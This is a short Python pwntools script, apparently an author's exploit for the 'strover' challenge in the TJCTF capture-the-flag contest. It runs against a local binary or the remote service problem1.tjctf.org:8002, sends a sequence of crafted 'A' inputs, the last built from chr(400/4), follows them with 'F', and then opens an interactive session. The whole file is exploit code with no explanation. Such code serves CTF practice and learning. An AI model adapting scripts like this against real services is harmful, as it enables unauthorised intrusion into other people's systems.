#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
from sys import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c' ]

if argv[1] == 'l':
	io = process('./strover')
else:
	io = remote('problem1.tjctf.org', 8002)

for i in range(8):
	io.sendline("A "+str(i)*4)

io.sendline( "A " + chr(400/4)*4 )
io.sendline("F")

io.interactive()

